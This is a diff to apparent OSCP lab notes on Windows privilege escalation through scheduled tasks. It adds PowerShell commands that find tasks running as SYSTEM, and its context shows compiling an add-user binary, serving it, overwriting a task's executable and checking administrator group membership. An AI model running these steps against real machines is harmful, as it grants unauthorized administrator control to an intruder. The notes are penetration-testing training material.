@@ -36,23 +36,72 @@ Find task running as admin/SYSTEM
 
 ### Step 1 — Enumerate Scheduled Tasks
 
+**Raw full detail (overwhelming but complete):**
 ```powershell
-# Full verbose list — most detail
 schtasks /query /fo LIST /v
-
-# Quick overview
-schtasks /query /fo TABLE
 ```
+
+**Clean readable overview:**
+```powershell
+Get-ScheduledTask | Select TaskName, TaskPath, State
+```
+
+**Best — all important fields in one view:**
+```powershell
+Get-ScheduledTask | ForEach-Object {
+    [PSCustomObject]@{
+        Name   = $_.TaskName
+        Path   = $_.TaskPath
+        State  = $_.State
+        RunAs  = $_.Principal.UserId
+        Action = ($_.Actions | Select -First 1).Execute
+    }
+} | Format-Table -AutoSize
+```
+
+**Filter for privileged tasks only:**
+```powershell
+# Tasks running as SYSTEM or admin
+Get-ScheduledTask | Where-Object {
+    $_.Principal.UserId -like "*SYSTEM*" -or
+    $_.Principal.UserId -like "*Admin*"
+} | Select TaskName, TaskPath
+```
+
+**Filter out built-in Windows noise:**
+```powershell
+# Non-Microsoft tasks only — focus on user-installed ones
+Get-ScheduledTask | Where-Object {
+    $_.TaskPath -notlike "\Microsoft*"
+} | Select TaskName, TaskPath, State
+```
+
+**Get full detail on a specific task:**
+```powershell
+Get-ScheduledTaskInfo -TaskName "<TaskName>"
+```
+
+**Enumeration method comparison:**
+
+| Method | Best for |
+|---|---|
+| `schtasks /query /fo LIST /v` | Complete raw detail |
+| `Get-ScheduledTask` | Clean readable overview |
+| Filter by `Principal.UserId` | Quickly find privileged tasks |
+| Filter by `TaskPath` | Ignore built-in Windows noise |
+
+> 💡 Start with the non-Microsoft filter — cuts 90% of noise and leaves only tasks worth investigating.
+
+---
 
 **Key fields to look for:**
 
 | Field | What to look for |
 |---|---|
-| `Run As User` | `SYSTEM`, admin, or privileged user |
-| `Task To Run` | Path to the binary/script executed |
+| `Run As User` / `RunAs` | `SYSTEM`, admin, or privileged user |
+| `Task To Run` / `Action` | Path to the binary/script executed |
 | `Next Run Time` | Must be in the future |
 | `Schedule Type` | How often it runs (every minute = ideal) |
-| `Author` | Who created the task |
 
 ---
 
@@ -91,7 +140,10 @@ int main()
 ```
 
 ```bash
+# Compile
 x86_64-w64-mingw32-gcc adduser.c -o binary.exe
+
+# Serve
 python3 -m http.server 80
 ```
 
@@ -117,12 +169,12 @@ move .\binary.exe C:\path\to\task\binary.exe
 ### Step 5 — Wait for Trigger & Verify
 
 ```powershell
-# Wait for the next scheduled run, then check
+# Wait for next scheduled run then check
 net user
 net localgroup administrators
 ```
 
-> No manual restart needed — the Task Scheduler fires the binary automatically.
+> No manual restart needed — Task Scheduler fires the binary automatically.
 
 ---
 
@@ -142,7 +194,7 @@ net user hacker /delete
 | What you replace | Service `.exe` | Task action binary |
 | How you trigger | `net stop/start` or reboot | Wait for schedule |
 | Runs as | Service account | Task's configured user |
-| You control timing? | ✅ Yes | ❌ No — depends on schedule |
+| You control timing? | ✅ Yes | ❌ Depends on schedule |
 | Needs service perms? | ✅ Yes | ❌ No |
 
 ---
@@ -150,8 +202,11 @@ net user hacker /delete
 ## ⚡ Quick Reference
 
 ```powershell
-# Enumerate all tasks verbosely
-schtasks /query /fo LIST /v
+# Best enumeration — non-Microsoft tasks only
+Get-ScheduledTask | Where-Object {$_.TaskPath -notlike "\Microsoft*"} | Select TaskName, TaskPath, State
+
+# Find privileged tasks
+Get-ScheduledTask | Where-Object {$_.Principal.UserId -like "*SYSTEM*" -or $_.Principal.UserId -like "*Admin*"} | Select TaskName, TaskPath
 
 # Check binary permissions
 icacls "C:\path\to\binary.exe"
@@ -174,3 +229,5 @@ python3 -m http.server 80
 ```
 
 ---
+
+*OSCP PEN-200 | Scheduled Task Privilege Escalation | Authorized lab use only*
